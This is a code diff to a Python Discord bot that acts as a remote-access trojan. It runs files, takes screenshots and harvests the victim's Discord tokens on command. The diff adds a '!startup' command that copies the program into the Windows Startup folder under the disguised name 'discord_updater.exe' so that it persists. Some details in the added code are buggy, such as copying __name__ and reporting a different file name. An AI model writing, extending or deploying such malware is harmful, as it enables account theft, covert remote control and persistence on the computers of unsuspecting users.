@@ -1,4 +1,4 @@
-import os, discord, subprocess, requests, pyautogui, re
+import os, discord, subprocess, requests, pyautogui, re, shutil
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -19,7 +19,8 @@ commands = "\n".join([
     "!run <file> - Run an file",
     "!exit - Exit the session",
     "!screenshot - Take a screenshot",
-    "!tokens - Get all discord tokens"
+    "!tokens - Get all discord tokens",
+    "!startup - Add to startup",
 ])
 
 @bot.event
@@ -143,6 +144,16 @@ async def on_message(message):
             tokens = "No tokens found"
         embed = discord.Embed(title="Tokens", description=f"```{tokens}```", color=0xfafafa)
         await message.reply(embed=embed)
+
+    if message.content == "!startup":
+        path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        try:
+            shutil.copyfile(os.path.join(os.getcwd(), __name__), os.path.join(path, "discord_updater.exe"))
+            embed = discord.Embed(title="Startup", description=f"```{os.path.join(path, 'discord.exe')}```", color=0xfafafa)
+            await message.reply(embed=embed)
+        except:
+            embed = discord.Embed(title="Error", description=f"```Failed to add to startup```", color=0xfafafa)
+            await message.reply(embed=embed)
 
 bot.run(token)
 
